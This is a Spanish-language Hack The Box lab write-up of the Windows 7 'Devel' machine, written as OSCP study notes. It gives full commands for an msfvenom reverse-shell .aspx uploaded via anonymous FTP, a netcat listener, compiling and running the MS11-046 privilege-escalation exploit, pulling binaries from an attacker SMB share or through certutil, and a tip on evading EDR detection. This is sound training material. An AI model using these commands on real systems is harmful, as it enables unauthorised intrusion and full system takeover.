[🟠 Devel — HTB [Windows · Easy] 32515bd2d16c806080e6c24ee5a355dd.md](https://github.com/user-attachments/files/28263097/Devel.HTB.Windows.Easy.32515bd2d16c806080e6c24ee5a355dd.md)
# 🟠 Devel — HTB [Windows · Easy]

> **Plataforma:** Hack The Box | **OS:** Windows 7 x86 (IIS 7.5) | **Dificultad:** Easy | **CVE PrivEsc:** MS11-046 (afd.sys)
> 

| Campo | Detalle |
| --- | --- |
| IP | `10.10.10.5` |
| Foothold | FTP anónimo + subida de webshell .aspx a IIS |
| PrivEsc | MS11-046 — afd.sys Local Privilege Escalation |
| Acceso final | **NT AUTHORITYSYSTEM** |
| Transferencia exploit | impacket-smbserver (FTP y HTTP fallaron) |

---

# 1. Reconocimiento

## Nmap

```bash
nmap -sV -sC -p- --min-rate 5000 -oN devel_full.nmap 10.10.10.5
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: TRACE OPTIONS GET HEAD POST
|_http-title: IIS7
```

**Conclusiones inmediatas:**

- FTP con **login anónimo** habilitado.
- IIS 7.5 sirviendo en el puerto 80 — extensión nativa `.aspx`.
- El directorio raíz del FTP **es el mismo que el de IIS** (`C:\inetpub\wwwroot`). Lo que subes por FTP se puede ejecutar vía web directamente.

---

# 2. Foothold — Subida de Webshell por FTP

## Generar el payload .aspx

```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=10.10.14.X LPORT=4444 \
  -f aspx -o shell.aspx
```

> **Por qué .aspx y no .php:** IIS con [ASP.NET](http://ASP.NET) ejecuta `.aspx` nativamente. PHP no está instalado. Siempre adaptar la extensión del payload al stack del servidor web.
> 

## Subir por FTP

```bash
ftp 10.10.10.5
# Usuario: anonymous | Password: (enter)
binary          # ← CRÍTICO: modo binario antes de subir ejecutables
put shell.aspx
```

## Activar listener y ejecutar

```bash
nc -lvnp 4444
```

```
http://10.10.10.5/shell.aspx
```

Shell recibida como `iis apppool\web`.

---

# 3. Enumeración Post-Foothold

```bash
systeminfo
```

```
Host Name:    DEVEL
OS Name:      Microsoft Windows 7 Enterprise
OS Version:   6.1.7600 N/A Build 7600
System Type:  X86-based PC
```

Windows 7 Build 7600 x86 → candidato directo a **MS11-046**.

```bash
searchsploit ms11-046
# → windows_x86/local/40564.c
searchsploit -m windows_x86/local/40564.c
```

---

# 4. Escalada de Privilegios — MS11-046

## Compilar desde Kali con mingw

```bash
sudo apt install mingw-w64 -y
i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
file exploit.exe
# → PE32 executable (console) Intel 80386
```

## Transferir el exploit al target

Aquí es donde aparecieron todos los problemas. Ver sección completa en **Errores y Lecciones**.

**Método que funcionó — impacket-smbserver:**

```bash
# En Kali, desde la carpeta donde está exploit.exe
impacket-smbserver share . -smb2support
```

```bash
# En la shell de IIS
copy \\10.10.14.X\share\exploit.exe C:\Windows\Temp\exploit.exe
cd C:\Windows\Temp
exploit.exe
```

## Resultado

```
whoami
nt authority\system
```

## Flags

```bash
dir /s /b C:\user.txt
dir /s /b C:\root.txt
type C:\Users\babis\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

---

# 5. Historial de Errores — Lo Que Falló y Por Qué

Esta sección documenta todos los obstáculos reales encontrados durante la máquina. Es la parte más valiosa para el OSCP.

## Error 1 — Descarga de [Sherlock.ps](http://Sherlock.ps)1 y exploit.exe corruptos (wget sobre URL de GitHub)

**Síntoma:** `Missing expression after unary operator '--'` al ejecutar el .ps1, o `Program too big to fit in memory` con el .exe.

**Causa:** Al usar `wget` sobre la URL normal de GitHub (la que muestra la interfaz web), se descarga el HTML de la página completa — menús, botones, estilos CSS — en lugar del código fuente real. Windows intentaba ejecutar etiquetas HTML como `<div>` o `---` como si fueran comandos.

**Solución:** Usar siempre la URL **raw** de GitHub:

```bash
# MAL — descarga HTML
wget https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1

# BIEN — descarga el código fuente real
wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
```

---

## Error 2 — FTP en modo ASCII corrompía el binario

**Síntoma:** `This program cannot be run in DOS mode` al ejecutar exploit.exe en la víctima.

**Causa:** El cliente FTP usa por defecto el modo **ASCII**, diseñado para archivos de texto. Este modo convierte los caracteres de fin de línea (`\n` de Linux a `\r\n` de Windows). Al aplicar esa conversión a un binario `.exe`, altera bytes críticos de la estructura PE, rompiendo la firma del ejecutable. Windows lo detecta como archivo inválido.

**Solución:** Siempre activar modo binario antes de subir ejecutables:

```bash
ftp> binary
ftp> put exploit.exe
```

Verificación previa en Kali:

```bash
file exploit.exe
# Debe decir: PE32 executable (console) Intel 80386
# Si dice: ASCII text → es HTML, no un binario real
```

---

## Error 3 — Error de compilación `too many arguments to ZwQuerySystemInformation`

**Síntoma:**

```
40564.c:488:5: error: too many arguments to function 'ZwQuerySystemInformation'; expected 0, have 4
```

**Causa:** Los headers modernos de mingw-w64 declaran `ZwQuerySystemInformation` sin parámetros (declaración vacía), conflicto con el código del exploit que la llama con 4 argumentos. El compilador moderno ve la inconsistencia.

**Solución:** Editar el `.c` y añadir cast explícito en las líneas 488 y 502:

```c
// Cambiar:
ZwQuerySystemInformation(11, ...);

// Por:
((NTSTATUS(WINAPI*)(ULONG,PVOID,ULONG,PULONG))ZwQuerySystemInformation)(11, ...);
```

---

## Error 4 — FTP subió el exploit pero el binario llegó corrupto

**Síntoma:** Al ejecutar el exploit subido por FTP aparecían estos errores:

- `This program cannot be run in DOS mode`
- `Program too big to fit in memory`

**Causa real:** El binario llegó corrupto a la víctima. Incluso activando `binary` antes de la transferencia, el exploit no ejecutaba correctamente. El FTP no es fiable para transferir binarios compilados en un entorno de pentesting — hay demasiadas variables (modo de transferencia, configuración del servidor FTP, posibles restricciones) que pueden alterar el archivo en tránsito.

El error `This program cannot be run in DOS mode` indica que Windows detecta que la cabecera PE del ejecutable no es válida — el archivo llegó alterado. El `Program too big to fit in memory` es otro síntoma del mismo problema: el binario tiene bytes corruptos que confunden al cargador de Windows.

**Lo que falló:**

```bash
ftp> binary
ftp> put exploit.exe   # subió sin errores visibles
```

```bash
C:\inetpub\wwwroot\exploit.exe
# → This program cannot be run in DOS mode
# → Program too big to fit in memory
```

**Solución:** Abandonar el FTP para transferir el exploit y usar `impacket-smbserver`, que transfiere los datos como bloques puros sin ningún tipo de conversión. El archivo llega byte a byte exactamente igual que en Kali.

---

## Error 5 — impacket-smbserver como solución definitiva

**Por qué el SMB fue la solución cuando FTP y HTTP fallaron:**

SMB es el protocolo nativo de Windows para transferencia de archivos en red. A diferencia del FTP, no intenta traducir nada — transfiere los datos como bloques puros, byte a byte. El archivo llega exactamente igual a como salió.

Además, `copy \\IP\share\archivo.exe` es una acción de administración de red completamente normal en Windows, lo que la hace menos detectable por EDRs comparada con `certutil` o `powershell IWR`.

```bash
# En Kali — compartir la carpeta actual
impacket-smbserver share . -smb2support
#                  ↑       ↑ ← necesario para Windows 10/2019+
#                nombre    carpeta a compartir (. = directorio actual)

# En la víctima
copy \\10.10.14.X\share\exploit.exe C:\Windows\Temp\
```

**Por qué `C:\Windows\Temp` y no `wwwroot`:** El directorio web de IIS a veces tiene políticas de "No Ejecución" configuradas por IIS. `C:\Windows\Temp` siempre tiene permisos de escritura y ejecución para el usuario de IIS.

---

# 6. Moralejas y Notas para el OSCP

Esta sección sintetiza las lecciones más importantes que deja Devel para aplicar directamente en el examen.

---

## Moraleja 1 — Verificar el archivo ANTES de transferirlo

Antes de mover cualquier binario a la víctima, confirmar siempre en Kali:

```bash
file exploit.exe
```

Si no dice `PE32 executable` es que algo salió mal en la descarga o compilación. Nunca perder tiempo depurando en la víctima lo que se puede detectar en Kali en un segundo. En el OSCP cada minuto cuenta — este check te ahorra 20 minutos de confusión.

---

## Moraleja 2 — El modo FTP binary es obligatorio para binarios

En el OSCP aparecerán máquinas con FTP. La regla es simple y no tiene excepciones: **siempre escribir `binary` antes de `put` cuando se sube cualquier cosa que no sea texto plano**. Ejecutables, scripts compilados, zips — todo va en modo binary. El modo ASCII solo es para `.txt` y `.ps1` cuando no hay otra opción.

---

## Moraleja 3 — FTP es para webshells, SMB es para exploits binarios

Esta máquina deja una lección muy concreta: **FTP es fiable para subir archivos de texto como webshells `.aspx`, pero no para transferir binarios compilados**. El exploit llegó corrupto por FTP y daba `This program cannot be run in DOS mode` al ejecutar — el binario estaba alterado en tránsito.

La solución fue montar un servidor SMB desde Kali y hacer `copy` desde la víctima directamente a `C:\Windows\Temp`. SMB transfiere los datos como bloques puros sin ninguna conversión — el archivo llega byte a byte exactamente igual que en Kali.

El orden de preferencia para transferir **binarios** en Windows:

1. **SMB** (`impacket-smbserver share . -smb2support`) → el más fiable, protocolo nativo de Windows, sin corrupción.
2. **HTTP** (`python3 -m http.server` + `certutil -urlcache -split -f URL archivo`) → rápido y simple.
3. **FTP en modo binary** → funciona para webshells de texto, arriesgado para ejecutables.

Regla para el OSCP: si el exploit da `cannot be run in DOS mode` o `too big to fit in memory`, el archivo está corrupto — verificar con `file exploit.exe` en Kali y cambiar el método de transferencia.

---

## Moraleja 4 — Identificar la arquitectura antes de compilar o generar payloads

`systeminfo` en el primer momento posible. Windows 7 x86 requiere:

- Compilar con `i686-w64-mingw32-gcc` (no x86_64)
- Payload de msfvenom con `windows/shell_reverse_tcp` (no `windows/x64/`)
- Usar `sc_x86.bin` si se usa AutoBlue

Un payload o exploit compilado para la arquitectura incorrecta da `ERROR_CODE: 193` o simplemente no hace nada. Siempre arquitectura primero.

---

## Moraleja 5 — Los exploits de kernel antiguos suelen necesitar ajustes de compilación

El exploit 40564.c de MS11-046 no compila limpio en mingw-w64 moderno sin modificaciones. Esto es normal con exploits de ExploitDB de 2007-2015 — fueron escritos para compiladores de la época. Saber hacer el cast explícito de punteros a función es una habilidad que aparecerá repetidamente en el OSCP con exploits similares. No rendirse en el primer error de compilación.

---

## Moraleja 6 — El vector completo de Devel como patrón reutilizable

```
FTP anónimo con acceso a wwwroot
    ↓
Subida de webshell .aspx (extensión del stack del servidor)
    ↓
RCE como iis apppool (usuario de servicio, sin privilegios)
    ↓
systeminfo → OS viejo sin parches → buscar kernel exploit
    ↓
Compilar exploit en Kali → transferir por SMB → ejecutar → SYSTEM
```

Este patrón — **subida de archivo → RCE → kernel exploit** — aparece en múltiples máquinas del OSCP. Una vez interiorizado en Devel, se reconoce y ejecuta rápido.

---

# 7. Comandos Clave — Cheat Sheet de la Máquina

```bash
# Generar webshell
msfvenom -p windows/shell_reverse_tcp LHOST=TU_IP LPORT=4444 -f aspx -o shell.aspx

# Subir por FTP (SIEMPRE modo binary)
ftp 10.10.10.5
binary
put shell.aspx

# Verificar exploit antes de transferir
file exploit.exe   # debe decir PE32, no ASCII text

# Compilar MS11-046 para x86
i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32

# Servidor SMB para transferir binarios
impacket-smbserver share . -smb2support

# En víctima — copiar y ejecutar
copy \\TU_IP\share\exploit.exe C:\Windows\Temp\
cd C:\Windows\Temp
exploit.exe

# Flags
dir /s /b C:\user.txt
dir /s /b C:\root.txt
```

![image.png](%F0%9F%9F%A0%20Devel%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%5D/image.png)

![image.png](%F0%9F%9F%A0%20Devel%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%5D/image%201.png)
